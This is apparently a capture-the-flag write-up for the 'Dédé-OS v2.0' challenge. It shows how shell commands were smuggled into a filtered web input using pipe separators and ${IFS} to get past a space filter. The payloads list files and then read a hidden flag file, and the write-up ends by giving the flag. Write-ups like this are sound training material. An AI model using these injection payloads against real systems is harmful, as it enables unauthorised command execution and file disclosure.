# Dédé-OS v2.0

### Description

Final boss of the elite H4k3rs, the developer worked well on this more secure version.

Last version of the Dede-OS challenge

### Solution

Remember what I tested in the previous versions :

```bash
# Version 1
$ ;ls -la;

#Version 2
$ ;ls${IFS}-la;
```

Of course thess payloads doesn't work anymore.

However, "I have many strings to my bow" as we say in French.

Instead of using `;` or `&` we can also use : `|`

```bash
$ |ls|

Target achieved
```
Now that we know `|` is not filtered we can try

```bash
$ ||ls||

index.php
style.css
Target achieved
```

The flag seems to be hidden a third time !

The space caracter was filtered in the v2, so I guess it is also here. Let's try to counter that.

```bash
$ ||ls${IFS}-la||

total 20
dr-xr-xr-x    1 root     root          4096 Nov 28 18:42 .
drwxr-xr-x    1 root     root          4096 Dec 11 12:08 ..
dr-xr-xr-x    1 root     root          4096 Nov 28 02:11 .secret
-r-xr-xr-x    1 root     root          1353 Nov 28 02:11 index.php
-r-xr-xr-x    1 root     root           778 Nov 28 02:11 style.css
```
There we go :)

Final payload
```bash
$ ||cat${IFS}.secret/2/1/3/flag.txt||
```

Flag : `H2G2{Y0u_4r3_s0_g0oD_4t_h4ck1NG!}`